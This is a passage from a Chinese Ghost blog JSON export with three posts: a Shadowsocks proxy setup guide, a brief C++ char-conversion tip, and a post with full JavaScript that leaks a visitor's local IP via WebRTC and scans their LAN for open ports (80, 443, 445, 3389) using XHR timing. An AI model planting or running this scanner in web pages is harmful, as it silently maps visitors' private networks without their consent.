\\\"password\\\":\\\"xxxx\\\",\\n    \\\"timeout\\\":300,\\n    \\\"method\\\":\\\"aes-256-cfb\\\",\\n    \\\"fast_open\\\": true,\\n    \\\"workers\\\":1  //??????\\n}\\n```\\n* 最后，用shadowsocks加载这个json文件，启动。\\n```\\nssserver -c ss5.json\\n后台启动方式:\\nnohup ssserver -c ss5.json 1>log 2>err &\\n```\\n* 客户端：[https://github.com/shadowsocks/shadowsocks/wiki/Ports-and-Clients](https://github.com/shadowsocks/shadowsocks/wiki/Ports-and-Clients)。chrome插件用的SwitchyOmega。\\n\\n> https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li>检查服务器下Python 版本，要有2.6 or 2.7。我用的ubuntu12，自带的就是2.7。</li>\n</ul>\n<pre><code>python --version  \nPython 2.7.3  \n</code></pre>\n<ul>\n<li>然后安装pip，python的软件包管理(这个好比node的npm)。python-gevent这个最好也要加上。</li>\n</ul>\n<p><code>apt-get install python-gevent python-pip</code></p>\n<ul>\n<li>下一步用pip安装shadowsocks</li>\n</ul>\n<p><code>pip install shadowsocks</code></p>\n<ul>\n<li>然后在任意位置新建一个json文件，如xxx.json编辑如下内容，保存。</li>\n</ul>\n<pre><code>{\n    &quot;server&quot;:&quot;server_ip&quot;,\n    &quot;server_port&quot;:23456,\n    &quot;local_address&quot;: &quot;127.0.0.1&quot;,\n    &quot;local_port&quot;:3333,\n    &quot;password&quot;:&quot;xxxx&quot;,\n    &quot;timeout&quot;:300,\n    &quot;method&quot;:&quot;aes-256-cfb&quot;,\n    &quot;fast_open&quot;: true,\n    &quot;workers&quot;:1  //??????\n}\n</code></pre>\n<ul>\n<li>最后，用shadowsocks加载这个json文件，启动。</li>\n</ul>\n<pre><code>ssserver -c ss5.json\n后台启动方式:\nnohup ssserver -c ss5.json 1&gt;log 2&gt;err &amp;\n</code></pre>\n<ul>\n<li>客户端：<a href=\"https://github.com/shadowsocks/shadowsocks/wiki/Ports-and-Clients\">https://github.com/shadowsocks/shadowsocks/wiki/Ports-and-Clients</a>。chrome插件用的SwitchyOmega。</li>\n</ul>\n<blockquote>\n<p><a href=\"https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt\">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a></p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"62","plaintext":" * 检查服务器下Python 版本，要有2.6 or 2.7。我用的ubuntu12，自带的就是2.7。\n\npython --version  \nPython 2.7.3  \n\n\n * 然后安装pip，python的软件包管理(这个好比node的npm)。python-gevent这个最好也要加上。\n\napt-get install python-gevent python-pip\n\n * 下一步用pip安装shadowsocks\n\npip install shadowsocks\n\n * 然后在任意位置新建一个json文件，如xxx.json编辑如下内容，保存。\n\n{\n    \"server\":\"server_ip\",\n    \"server_port\":23456,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":3333,\n    \"password\":\"xxxx\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": true,\n    \"workers\":1  //??????\n}\n\n\n * 最后，用shadowsocks加载这个json文件，启动。\n\nssserver -c ss5.json\n后台启动方式:\nnohup ssserver -c ss5.json 1>log 2>err &\n\n\n * 客户端：https://github.com/shadowsocks/shadowsocks/wiki/Ports-and-Clients\n   。chrome插件用的SwitchyOmega。\n\n> https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-26T08:54:08.000Z","created_by":"1","updated_at":"2017-08-21T02:09:54.000Z","updated_by":"1","published_at":"2016-07-26T09:14:04.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2fc","uuid":"77e101c2-77f8-4ab9-be57-8bda5783a61c","title":"C++","slug":"c","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"'3'-'0'，才表示字符c和字符0的ASCALL码差值.char转int。\\nchar c=3 + '0' int转char。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>'3'-'0'，才表示字符c和字符0的ASCALL码差值.char转int。<br>\nchar c=3 + '0' int转char。</p>\n<!--kg-card-end: markdown-->","comment_id":"63","plaintext":"'3'-'0'，才表示字符c和字符0的ASCALL码差值.char转int。\nchar c=3 + '0' int转char。","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-10-08T08:12:47.000Z","created_by":"1","updated_at":"2016-10-14T10:19:53.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2fd","uuid":"2879ac8e-82a7-498e-aa18-be10381ce84c","title":"ajax另类用法","slug":"ajaxling-lei-yong-fa","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\najax扫描局域网内部主机端口，发送ajax请求到80，或者557等端口。如果立马返回错误，说明端口存活，超时说明没有打开端口。\\n> 代码如下\\n```\\n\\t\\tfunction run(callback){\\n\\t\\t//////////////////////////////////////////////////////////////\\n\\t\\t///修改\\n\\t\\tfunction cTreeNode(sNodeName, sIconURL) {\\n\\t\\t\\tthis.sNodeName=sNodeName;\\n\\t\\t\\tthis.sIconURL=sIconURL;\\n\\t\\t\\n\\t\\t};\\n\\t\\tcTreeNode.prototype.setName = function cTreeNode_setName(sNewName) {\\n\\t\\t\\tthis.sNodeName = sNewName;\\n\\t\\t};\\n\\t\\tcTreeNode.prototype.setIcon = function cTreeNode_setName(sIconURL) {\\n\\t\\t\\tthis.sIconURL=sIconURL;\\n\\t\\t};\\n\\t\\t//var i=0;\\n\\t\\tcTreeNode.prototype.appendChild = function cTreeNode_appendChild(oChildTreeNode) {\\n\\t\\t\\t\\n\\t\\t\\tthis[oChildTreeNode.sNodeName]=oChildTreeNode;\\n\\t\\t\\t//i++;\\n\\t\\t\\toChildTreeNode.parent=this;\\n\\t\\t\\treturn oChildTreeNode;\\n\\t\\t};\\n\\t\\tcTreeNode.prototype.remove = function cTreeNode_remove() {\\n\\t\\t\\t\\n\\t\\t\\tfor(var x in this.parent){\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tif(this.parent[x]===this){\\n\\t\\t\\t\\t\\tdelete this.parent[x];\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\n\\t\\t};\\n\\t\\t\\n\\t\\t\\n\\t\\t//////////////////////////////////////////////////////////\\n\\t\\tfunction fGetIPAddresses(oIFrame, fSuccessCallback, fErrorCallback) {\\n\\t\\t\\t//<iframe id=\\\"iframe\\\" sandbox=\\\"allow-same-origin\\\" style=\\\"display: none\\\"></iframe>\\n\\t\\t\\tfunction fcGetRTCPeerConnection(oWindow) {\\n\\t\\t\\t\\treturn oWindow && (oWindow.RTCPeerConnection || oWindow.mozRTCPeerConnection || oWindow.webkitRTCPeerConnection);\\n\\t\\t\\t}\\n\\t\\t\\tvar cRTCPeerConnection = fcGetRTCPeerConnection(window) || fcGetRTCPeerConnection(oIFrame.contentWindow);\\n\\t\\t\\tif(!cRTCPeerConnection) {\\n\\t\\t\\t\\tfErrorCallback(\\\"RTCPeerConnection feature not available\\\");\\n\\t\\t\\t\\treturn;\\n\\t\\t\\t};\\n\\n\\t\\t\\tvar oRTCPeerConnection = new cRTCPeerConnection({\\n\\t\\t\\t\\t\\\"iceServers\\\": [{\\n\\t\\t\\t\\t\\t\\\"urls\\\": \\\"stun:stun.services.mozilla.com\\\"\\n\\t\\t\\t\\t}, ]\\n\\t\\t\\t}, {\\n\\t\\t\\t\\t\\\"optional\\\": [{\\n\\t\\t\\t\\t\\t\\\"RtpDataChannels\\\": true\\n\\t\\t\\t\\t}, ]\\n\\t\\t\\t});\\n\\n\\t\\t\\tdsIPAddresses = {};\\n\\t\\t\\toRTCPeerConnection.onicecandidate = function fRTCPeerConnectionIceEventHandler(oRTCPeerConnectionIceEvent) {\\n\\t\\t\\t\\tvar oRTCIceCandidate = oRTCPeerConnectionIceEvent.candidate;\\n\\t\\t\\t\\tif(oRTCIceCandidate) {\\n\\t\\t\\t\\t\\tvar asCandidate = oRTCIceCandidate.candidate.split(\\\" \\\");\\n\\t\\t\\t\\t\\tif(asCandidate[7] == \\\"host\\\") {\\n\\t\\t\\t\\t\\t\\tvar sIPAddress = asCandidate[4];\\n\\t\\t\\t\\t\\t\\tif(/[0-9]{1,3}(?:\\\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7}/.exec(sIPAddress)) {\\n\\t\\t\\t\\t\\t\\t\\tdsIPAddresses[sIPAddress] = 1;\\n\\t\\t\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t\\t\\t//\\tconsole.log(\\\"Ignored RTCIceCandidate \\\" + JSON.stringify(oRTCIceCandidate.candidate) + \\\": not an IP address.\\\");\\n\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t\\t//\\tconsole.log(\\\"Ignored RTCIceCandidate \\\" + JSON.stringify(oRTCIceCandidate.candidate) + \\\": not a \\\\\\\"host\\\\\\\".\\\");\\n\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t\\tfSuccessCallback(Object.keys(dsIPAddresses));\\n\\t\\t\\t\\t};\\n\\t\\t\\t};\\n\\n\\t\\t\\toRTCPeerConnection.createDataChannel(\\\"\\\");\\n\\t\\t\\toRTCPeerConnection.createOffer(\\n\\t\\t\\t\\tfunction fCreateOfferSuccess(oRTCSessionDescription) {\\n\\t\\t\\t\\t\\toRTCPeerConnection.setLocalDescription(\\n\\t\\t\\t\\t\\t\\toRTCSessionDescription,\\n\\t\\t\\t\\t\\t\\tfunction fSetLocalDescriptionSuccess() {},\\n\\t\\t\\t\\t\\t\\tfunction fSetLocalDescriptionError(sErrorMessage) {\\n\\t\\t\\t\\t\\t\\t\\tfErrorCallback(\\\"Could not set local description: \\\" + sErrorMessage);\\n\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t);\\n\\t\\t\\t\\t},\\n\\t\\t\\t\\tfunction fCreateOfferError(sErrorMessage) {\\n\\t\\t\\t\\t\\tfErrorCallback(\\\"Could not create offer: \\\" + sErrorMessage);\\n\\t\\t\\t\\t}\\n\\t\\t\\t);\\n\\t\\t};\\n\\t\\t///////////////////////////////////////////////////////\\n\\t\\tfunction fXHRScanIPAddressPorts(sIPAddress, auPortNumbers,oTreeNode, fCallback) {\\n\\t\\t\\tvar auDetectedPorts = [];\\n\\t\\t\\t(function fLoop() {\\n\\t\\t\\t\\tif(auPortNumbers.length) {\\n\\t\\t\\t\\t\\tvar uPortNumber = auPortNumbers.pop(),\\n\\t\\t\\t\\t\\t\\toXHR = new XMLHttpRequest(),\\n\\t\\t\\t\\t\\t\\tbFinished = false,\\n\\t\\t\\t\\t\\t\\toTimeout = setTimeout(function fXHRTimeout() {\\n\\t\\t\\t\\t\\t\\t\\tif(!bFinished) {\\n\\t\\t\\t\\t\\t\\t\\t\\tbFinished = true;\\n\\t\\t\\t\\t\\t\\t\\t\\toXHR.abort();\\n\\t\\t\\t\\t\\t\\t\\t\\tfLoop();\\n\\t\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\t}, 1500);\\n\\t\\t\\t\\t\\toXHR.onreadystatechange = function fXHRReadyStateChangeEventHandler(oEvent) {\\n\\t\\t\\t\\t\\t\\tif(oXHR.readyState == 4 && !bFinished) {\\n\\t\\t\\t\\t\\t\\t\\tbFinished = true;\\n\\t\\t\\t\\t\\t\\t\\tclearTimeout(oTimeout);\\n\\t\\t\\t\\t\\t\\t\\tauDetectedPorts.push(uPortNumber);\\n\\t\\t\\t\\t\\t\\t\\tfLoop();\\n\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\toXHR.open(\\\"GET\\\", location.protocol + \\\"//\\\" + sIPAddress + \\\":\\\" + uPortNumber);\\n\\t\\t\\t\\t\\toXHR.send();\\n\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t//\\tconsole.log(\\\"IP: \\\" + sIPAddress + \\\", ports: \\\" + (auDetectedPorts.join(\\\", \\\") || \\\"none\\\"));\\n\\t\\t\\t\\t\\toTreeNode.ports=auDetectedPorts.join(\\\", \\\") || null;\\n\\t\\t\\t\\t\\tfCallback(auDetectedPorts);\\n\\t\\t\\t\\t};\\n\\t\\t\\t})();\\n\\t\\t};\\n\\t\\t///////////////////////////////////////////////////\\n\\t\\tfunction fuIPAddress(sIPAddress) {\\n\\t\\t\\tvar asComponents = /([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3})/.exec(sIPAddress);\\n\\t\\t\\tif(!asComponents) throw new TypeError(\\\"Invalid IPv4 address \\\" + sIPAddress);\\n\\t\\t\\tvar uIPAddress = 0;\\n\\t\\t\\tfor(var uByte = 0; uByte < 4; uByte++) {\\n\\t\\t\\t\\tuIPAddress = (uIPAddress << 8) + parseInt(asComponents[uByte + 1]); // no sanity checks!\\n\\t\\t\\t};\\n\\t\\t\\treturn uIPAddress;\\n\\t\\t};\\n\\n\\t\\tfunction fsIPAddress(uIPAddress) {\\n\\t\\t\\tvar asIPAddress = [];\\n\\t\\t\\tfor(var uByte = 0; uByte < 4; uByte++) {\\n\\t\\t\\t\\tasIPAddress[uByte] = ((uIPAddress >> (24 - uByte * 8)) & 0xFF).toString();\\n\\t\\t\\t};\\n\\t\\t\\treturn asIPAddress.join(\\\".\\\");\\n\\t\\t};\\n\\t\\t////////////////////////////////////////////\\n\\n\\t\\tfunction fScanNetworksForIPAddresses(asIPAddresses, fCallback) {\\n\\t\\t\\t(function fScanNetworksForIPAddressesLoop() {\\n\\t\\t\\t\\tif(asIPAddresses.length != 0) {\\n\\t\\t\\t\\t\\treturn fScanNetwork(asIPAddresses.shift(), fScanNetworksForIPAddressesLoop);\\n\\t\\t\\t\\t};\\n\\t\\t\\t\\tfCallback();\\n\\t\\t\\t})();\\n\\t\\t};\\n\\t\\tvar oNetworkTreeNode;\\n\\t\\t\\n\\t\\tfunction fScanNetwork(sIPAddress, fCallback) {\\n\\t\\t\\toNetworkTreeNode = new cTreeNode(\\\"Determining subnet for \\\" + sIPAddress + \\\"...\\\", \\\"scanning.svg\\\"),\\n\\t\\t\\t\\tuIPAddress = fuIPAddress(sIPAddress);\\n\\t\\t\\t//root=oNetworkTreeNode.oRootElement;\\n\\t\\t\\tfGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, function(uPrefixLength) {\\n\\t\\t\\t\\toNetworkTreeNode.setName(\\\"Scanning network \\\" + sIPAddress + \\\"/\\\" + uPrefixLength + \\\"...\\\")\\n\\t\\t\\t\\tvar uBitMask = -(1 << (32 - uPrefixLength)),\\n\\t\\t\\t\\t\\tuAllOnes = (1 << (32 - uPrefixLength)) - 1,\\n\\t\\t\\t\\t\\tuStartIPAddress = uIPAddress & uBitMask,\\n\\t\\t\\t\\t\\tuEndIPAddress = uIPAddress | uAllOnes,\\n\\t\\t\\t\\t\\tuCurrentIPAddress = uStartIPAddress + 1,\\n\\t\\t\\t\\t\\tuScansStarted = 0,\\n\\t\\t\\t\\t\\tuScansFinished = 0;\\n\\n\\t\\t\\t\\tfunction fScanIPAddressThread() {\\n\\t\\t\\t\\t\\tuScansStarted++;\\n\\t\\t\\t\\t\\tif(uCurrentIPAddress != uEndIPAddress) {\\n\\t\\t\\t\\t\\t\\tvar sCurrentIPAddress = fsIPAddress(uCurrentIPAddress);\\n\\t\\t\\t\\t\\t\\tif(uCurrentIPAddress == uIPAddress) {\\n\\t\\t\\t\\t\\t\\t\\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress + \\\" (you)\\\", \\\"machine.svg\\\"));\\n\\t\\t\\t\\t\\t\\t\\tfScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);\\n\\t\\t\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t\\t\\t\\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress, \\\"scanning.svg\\\"));\\n\\t\\t\\t\\t\\t\\t\\tfScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);\\n\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\treturn;\\n\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\toNetworkTreeNode.setName(\\\"Network \\\" + sIPAddress + \\\"/\\\" + uPrefixLength)\\n\\t\\t\\t\\t\\toNetworkTreeNode.setIcon(\\\"network.svg\\\")\\n\\t\\t\\t\\t\\tuScansFinished++;\\n\\n\\t\\t\\t\\t\\tif(uScansFinished==64){\\n\\t\\t\\t\\t\\t\\tfor(var x in oNetworkTreeNode){\\n\\t\\t\\t\\t\\t\\t\\tdelete\\toNetworkTreeNode[x].parent\\n\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t\\tcallback(oNetworkTreeNode);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\tif(uScansStarted == uScansFinished) {\\n\\t\\t\\t\\t\\t\\tfCallback();\\n\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t};\\n\\t\\t\\t\\tfor(var uThreads = 64; uThreads--;) setTimeout(fScanIPAddressThread);\\n\\t\\t\\t});\\n\\t\\t};\\n\\n\\t\\tfunction fGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, fCallback) {\\n\\t\\t\\t// Attempting to make an XHR to the broadcast address will result in an immediate error. Attempting to make an\\n\\t\\t\\t// XHR to an unused IP address will result in a time-out. We'll start with a large prefix and try increasingly\\n\\t\\t\\t// smaller ones to look for potential broadcast addresses using this timing difference. An IP address can also\\n\\t\\t\\t// be in-use by a *nix machine, which will also result in an immediate error. In an attempt to distinguish\\n\\t\\t\\t// between these two, try the next smaller prefix as well: if that fails, assume the former prefix is right and\\n\\t\\t\\t// return. Obviously this is not perfect, but it seems to work well enough.\\n\\t\\t\\tvar uPrefixLength = 26,\\n\\t\\t\\t\\tbBroadcastAddressMayHaveBeenFound = false,\\n\\t\\t\\t\\toTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(\\\"\\\", \\\"scanning.svg\\\"));\\n\\t\\t\\t(function fTestPrefixLength() {\\n\\t\\t\\t\\tif(uPrefixLength >= 16) {\\n\\t\\t\\t\\t\\tvar uAllOnes = (1 << (32 - uPrefixLength)) - 1,\\n\\t\\t\\t\\t\\t\\tsBroadcastIPAddress = fsIPAddress(uIPAddress | uAllOnes);\\n\\t\\t\\t\\t\\toTreeNode.setName(\\\"Testing potential broadcast address \\\" + sBroadcastIPAddress + \\\" (/\\\" + uPrefixLength + \\\")...\\\");\\n\\t\\t\\t\\t\\tfXHRScanIPAddressPorts(sBroadcastIPAddress, [2], oTreeNode,function(auDetectedPortNumbers) {\\n\\t\\t\\t\\t\\t\\tif(auDetectedPortNumbers.length > 0) {\\n\\t\\t\\t\\t\\t\\t\\t// This IP address results in an immediate error. It may be the broadcast address.\\n\\t\\t\\t\\t\\t\\t\\tif(uPrefixLength == 16) {\\n\\t\\t\\t\\t\\t\\t\\t\\t// We won't try to scan larger networks: use this.\\n\\t\\t\\t\\t\\t\\t\\t\\toTreeNode.remove();\\n\\t\\t\\t\\t\\t\\t\\t\\treturn fCallback(uPrefixLength);\\n\\t\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\t\\tbBroadcastAddressMayHaveBeenFound = true;\\n\\t\\t\\t\\t\\t\\t\\t// Try the next: in most setups this should fail if we just found the broadcast address.\\n\\t\\t\\t\\t\\t\\t\\tuPrefixLength--;\\n\\t\\t\\t\\t\\t\\t\\treturn fTestPrefixLength();\\n\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\tif(!bBroadcastAddressMayHaveBeenFound) {\\n\\t\\t\\t\\t\\t\\t\\t// This IP address is not used, nor was the previously tested one: try the next.\\n\\t\\t\\t\\t\\t\\t\\tuPrefixLength--;\\n\\t\\t\\t\\t\\t\\t\\treturn fTestPrefixLength();\\n\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\t// This IP address is not used, so the previous one is probably the broadcast address.\\n\\t\\t\\t\\t\\t\\toTreeNode.remove();\\n\\t\\t\\t\\t\\t\\tfCallback(uPrefixLength + 1);\\n\\t\\t\\t\\t\\t});\\n\\t\\t\\t\\t\\treturn;\\n\\t\\t\\t\\t};\\n\\t\\t\\t\\toTreeNode.setName(\\\"Could not determine subnet, assuming /24...\\\");\\n\\t\\t\\t\\toTreeNode.setIcon(\\\"error.svg\\\");\\n\\t\\t\\t\\tfCallback(8);\\n\\t\\t\\t})();\\n\\t\\t};\\n\\n\\t\\tfunction fScanIPAddress(uIPAddress, oMachineTreeNode, fCallback) {\\n\\t\\t\\tvar sIPAddress = fsIPAddress(uIPAddress);\\n\\t\\t\\toMachineTreeNode.setName(sIPAddress);\\n\\t\\t\\toMachineTreeNode.setIcon(\\\"scanning.svg\\\");\\n\\t\\t\\t// check if machine responds on the SMB/RDP ports, which both Windows and *nix machines might.\\n\\t\\t\\t\\n\\t\\t//\\tif(ipArr==null){\\n\\t\\t\\t\\tipArr= [80, 443, 445, 3389]\\n\\t\\t\\t//}\\n\\t\\t\\t///////////////////////////////////////////////\\n\\t\\t\\tfXHRScanIPAddressPorts(sIPAddress, ipArr, oTreeNode,function(auDetectedPortNumbers) {\\n\\t\\t\\t\\t// no response on this port: assume IP address not in use.\\n\\t\\t\\t\\tif(auDetectedPortNumbers.length == 0) {\\n\\t\\t\\t\\t\\toMachineTreeNode.remove();\\n\\t\\t\\t\\t\\treturn fCallback();\\n\\t\\t\\t\\t};\\n\\t\\t\\t\\t// check if machine responds to other ports that are very unlikely to be in use:\\n\\t\\t\\t\\tfXHRScanIPAddressPorts(sIPAddress, [2], oTreeNode,function(auDetectedPortNumbers) {\\n\\t\\t\\t\\t\\tif(auDetectedPortNumbers.length > 0) {\\n\\t\\t\\t\\t\\t\\t// machine responds to ports that are very unlikely to be in use: probably *nix.\\n\\t\\t\\t\\t\\t\\toMachineTreeNode.setIcon(\\\"machine.svg\\\");\\n\\t\\t\\t\\t\\t\\treturn fCallback();\\n\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t// check again as this is somewhat unreliable:\\n\\t\\t\\t\\t\\tfXHRScanIPAddressPorts(sIPAddress, [3],oTreeNode, function(auDetectedPortNumbers) {\\n\\t\\t\\t\\t\\t\\tif(auDetectedPortNumbers.length > 0) {\\n\\t\\t\\t\\t\\t\\t\\t// machine responds to ports that are very unlikely to be in use: probably *nix.\\n\\t\\t\\t\\t\\t\\t\\toMachineTreeNode.setIcon(\\\"machine.svg\\\");\\n\\t\\t\\t\\t\\t\\t} else {\\n\\t\\t\\t\\t\\t\\t\\t// machine does not appear to respond to ports that are not in use: probably Windows.\\n\\t\\t\\t\\t\\t\\t\\toMachineTreeNode.setIcon(\\\"windows.svg\\\");\\n\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\tfCallback();\\n\\t\\t\\t\\t\\t});\\n\\t\\t\\t\\t});\\n\\t\\t\\t});\\n\\t\\t};\\n\\n\\t\\tfGetIPAddresses(\\n\\t\\t\\twindow,\\n\\t\\t\\tfunction fGetIPAddressSuccessCallback(asIPAddresses) {\\n\\t\\t\\t\\tif(asIPAddresses.length == 0) {\\n\\t\\t\\t\\t\\tdocument.body.appendChild(new cTreeNode(\\\"Your local IP address could not be determined.\\\", \\\"error.svg\\\").oRootElement);\\n\\t\\t\\t\\t\\treturn;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tfScanNetworksForIPAddresses(asIPAddresses, function() {\\n\\t\\t\\t\\t\\tdocument.title = \\\"Done.\\\";\\n\\t\\t\\t\\t\\tclearInterval(oInterval);\\n\\t\\t\\t\\t\\tdocument.body.appendChild(new cTreeNode(\\\"Scanning took \\\" + fsGetTime() + \\\".\\\", \\\"info.svg\\\").oRootElement);\\n\\t\\t\\t\\t\\t// done scanning.\\n\\t\\t\\t\\t});\\n\\t\\t\\t},\\n\\t\\t\\tfunction fGetIPAddressErrorCallback(sErrorMessage) {\\n\\t\\t\\t\\tdocument.body.appendChild(new cTreeNode(sErrorMessage, \\\"error.svg\\\").oRootElement);\\n\\t\\t\\t}\\n\\t\\t);\\n\\t\\t}\\nrun(function(data){console.log(data)})\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>ajax扫描局域网内部主机端口，发送ajax请求到80，或者557等端口。如果立马返回错误，说明端口存活，超时说明没有打开端口。</p>\n<blockquote>\n<p>代码如下</p>\n</blockquote>\n<pre><code>\t\tfunction run(callback){\n\t\t//////////////////////////////////////////////////////////////\n\t\t///修改\n\t\tfunction cTreeNode(sNodeName, sIconURL) {\n\t\t\tthis.sNodeName=sNodeName;\n\t\t\tthis.sIconURL=sIconURL;\n\t\t\n\t\t};\n\t\tcTreeNode.prototype.setName = function cTreeNode_setName(sNewName) {\n\t\t\tthis.sNodeName = sNewName;\n\t\t};\n\t\tcTreeNode.prototype.setIcon = function cTreeNode_setName(sIconURL) {\n\t\t\tthis.sIconURL=sIconURL;\n\t\t};\n\t\t//var i=0;\n\t\tcTreeNode.prototype.appendChild = function cTreeNode_appendChild(oChildTreeNode) {\n\t\t\t\n\t\t\tthis[oChildTreeNode.sNodeName]=oChildTreeNode;\n\t\t\t//i++;\n\t\t\toChildTreeNode.parent=this;\n\t\t\treturn oChildTreeNode;\n\t\t};\n\t\tcTreeNode.prototype.remove = function cTreeNode_remove() {\n\t\t\t\n\t\t\tfor(var x in this.parent){\n\t\t\t\t\n\t\t\t\tif(this.parent[x]===this){\n\t\t\t\t\tdelete this.parent[x];\n\t\t\t\t}\n\t\t\t}\n\t\t\n\t\t};\n\t\t\n\t\t\n\t\t//////////////////////////////////////////////////////////\n\t\tfunction fGetIPAddresses(oIFrame, fSuccessCallback, fErrorCallback) {\n\t\t\t//&lt;iframe id=&quot;iframe&quot; sandbox=&quot;allow-same-origin&quot; style=&quot;display: none&quot;&gt;&lt;/iframe&gt;\n\t\t\tfunction fcGetRTCPeerConnection(oWindow) {\n\t\t\t\treturn oWindow &amp;&amp; (oWindow.RTCPeerConnection || oWindow.mozRTCPeerConnection || oWindow.webkitRTCPeerConnection);\n\t\t\t}\n\t\t\tvar cRTCPeerConnection = fcGetRTCPeerConnection(window) || fcGetRTCPeerConnection(oIFrame.contentWindow);\n\t\t\tif(!cRTCPeerConnection) {\n\t\t\t\tfErrorCallback(&quot;RTCPeerConnection feature not available&quot;);\n\t\t\t\treturn;\n\t\t\t};\n\n\t\t\tvar oRTCPeerConnection = new cRTCPeerConnection({\n\t\t\t\t&quot;iceServers&quot;: [{\n\t\t\t\t\t&quot;urls&quot;: &quot;stun:stun.services.mozilla.com&quot;\n\t\t\t\t}, ]\n\t\t\t}, {\n\t\t\t\t&quot;optional&quot;: [{\n\t\t\t\t\t&quot;RtpDataChannels&quot;: true\n\t\t\t\t}, ]\n\t\t\t});\n\n\t\t\tdsIPAddresses = {};\n\t\t\toRTCPeerConnection.onicecandidate = function fRTCPeerConnectionIceEventHandler(oRTCPeerConnectionIceEvent) {\n\t\t\t\tvar oRTCIceCandidate = oRTCPeerConnectionIceEvent.candidate;\n\t\t\t\tif(oRTCIceCandidate) {\n\t\t\t\t\tvar asCandidate = oRTCIceCandidate.candidate.split(&quot; &quot;);\n\t\t\t\t\tif(asCandidate[7] == &quot;host&quot;) {\n\t\t\t\t\t\tvar sIPAddress = asCandidate[4];\n\t\t\t\t\t\tif(/[0-9]{1,3}(?:\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7}/.exec(sIPAddress)) {\n\t\t\t\t\t\t\tdsIPAddresses[sIPAddress] = 1;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t//\tconsole.log(&quot;Ignored RTCIceCandidate &quot; + JSON.stringify(oRTCIceCandidate.candidate) + &quot;: not an IP address.&quot;);\n\t\t\t\t\t\t};\n\t\t\t\t\t} else {\n\t\t\t\t\t//\tconsole.log(&quot;Ignored RTCIceCandidate &quot; + JSON.stringify(oRTCIceCandidate.candidate) + &quot;: not a \\&quot;host\\&quot;.&quot;);\n\t\t\t\t\t};\n\t\t\t\t} else {\n\t\t\t\t\tfSuccessCallback(Object.keys(dsIPAddresses));\n\t\t\t\t};\n\t\t\t};\n\n\t\t\toRTCPeerConnection.createDataChannel(&quot;&quot;);\n\t\t\toRTCPeerConnection.createOffer(\n\t\t\t\tfunction fCreateOfferSuccess(oRTCSessionDescription) {\n\t\t\t\t\toRTCPeerConnection.setLocalDescription(\n\t\t\t\t\t\toRTCSessionDescription,\n\t\t\t\t\t\tfunction fSetLocalDescriptionSuccess() {},\n\t\t\t\t\t\tfunction fSetLocalDescriptionError(sErrorMessage) {\n\t\t\t\t\t\t\tfErrorCallback(&quot;Could not set local description: &quot; + sErrorMessage);\n\t\t\t\t\t\t}\n\t\t\t\t\t);\n\t\t\t\t},\n\t\t\t\tfunction fCreateOfferError(sErrorMessage) 